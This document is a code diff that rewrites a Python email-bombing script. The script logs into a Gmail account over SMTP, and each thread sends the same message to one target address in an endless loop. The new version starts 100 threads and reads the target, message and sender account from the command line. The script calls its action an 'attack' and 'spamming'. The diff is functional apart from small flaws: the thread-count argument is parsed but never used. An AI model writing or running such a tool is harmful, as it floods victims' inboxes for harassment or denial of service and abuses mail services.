@@ -1,36 +1,34 @@
-import sys, smtplib, threading, datetime
-
-email = input("Your email: ")
-user = email.split("@")[0]
-passw = input("Your password: ")
-
-help ="""Usage: python {} <TARGET_EMAIL> <MESSAGE>
-""".format(sys.argv[0])
-try:
-    target = sys.argv[1]
-    message = sys.argv[2]
-except:
-    print help
-    quit()
-
-def Spam(target, message):
-    global sent
+import sys, smtplib, ssl, threading, time
+    
+def spam(email, passw, target, message):
     try:
-        sent = 0
-        smtp = smtplib.SMTP_SSL("smtp.gmail.com", 465)
-        smtp.login(user, passw)
-        while 1:
-            smtp.sendmail(email, target, message)
-            sent += 1
-            sys.stdout.write("\r{} Emails Sent!".format(sent))
-                        sys.stdout.flush()
+        while True:
+            port = 587
+            smtp_server = "smtp.gmail.com"
+            context = ssl.create_default_context()
+            with smtplib.SMTP(smtp_server, port) as server:
+                server.ehlo() 
+                server.starttls(context=context)
+                server.ehlo() 
+                server.login(email, passw)
+                server.sendmail(email, target, message)
+                print("\rEmail sent!", end="\r")
+                time.sleep(5)
     except smtplib.SMTPAuthenticationError:
-        print("Too much logins, wait 2 minutes and try again.")
+        print("Too much logins, or password is incorrrect.")
         quit()
-    except: pass
-if __name__ == '__main__':
-    rn = str(datetime.datetime.now())[:19]
-    print("[+] Attack started at {}.\n".format(rn))
-    for i in range(10):
-        t = threading.Thread(target=Spam, args=(target, message))
+
+if __name__ == "__main__":
+    try:
+        target = sys.argv[1]
+        message = sys.argv[2]
+        email = sys.argv[3]
+        threads = int(sys.argv[4])
+    except:
+        print("Usage: python {} <TARGET_EMAIL> <MESSAGE> <YOUR_GMAIL> <THREADS_NUMBER>".format(sys.argv[0]))
+        quit()
+    passw = input("Your password: ")
+    print("Spamming started.")
+    for i in range(100):
+        t = threading.Thread(target=spam, args=(email, passw, target, message))
         t.start()
